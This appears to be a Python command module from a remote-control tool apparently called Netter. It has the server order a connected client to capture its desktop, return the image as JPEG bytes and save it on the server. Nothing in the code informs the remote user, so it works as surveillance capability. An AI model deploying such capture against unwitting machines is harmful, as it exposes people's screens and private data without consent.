from typing import TYPE_CHECKING
import io, time

from ..enums import PacketType
from ..commands import CommandBase

if TYPE_CHECKING:
    from ..http import NetterServer, NetterClient
    from ..enums import ClientResponse
    from ..client.connect import Connect


class screenshotCommand(CommandBase):
    __aliases__ = ["screenshot", "ss"]
    __description__ = "Take a screenshot from the client desktop"
    __extra__ = "Usage: `screenshot <Client ID>` | The screenshot will be saved to `client` directory"

    def execute(self, netServer: "NetterServer", *args) -> "NetterClient":
        if not args and not netServer.selectedClient:
            netServer.inputHandler.handle("help screenshot")  # Sends usage information of this command
            return False

        client: "NetterClient" = netServer.selectedClient if netServer.selectedClient is not None else netServer.get(UUID=args[0])

        if client is None:
            netServer.console_log("Provided clinet does not exists.", level="ERROR")
            return False

        client.socket_.send_(packetType=PacketType.COMMAND, data="screenshot")
        return client

    def on_server_receive(self, netServer: "NetterServer", client: "NetterClient", packet: "ClientResponse") -> None:
        with open(f"{client.username}T{time.time()}.jpeg", "wb") as file:
            file.write(packet.data)

        netServer.console_log(f"Screenshot saved as {client.username}T{time.time()}.jpeg", level="INFO")

    def on_client_receive(self, serverHandler: "Connect") -> str | bytes:
        from PIL import ImageGrab

        image = ImageGrab.grab().convert("RGB")
        byteArray = io.BytesIO()

        image.save(byteArray, format="jpeg")

        return byteArray.getvalue()
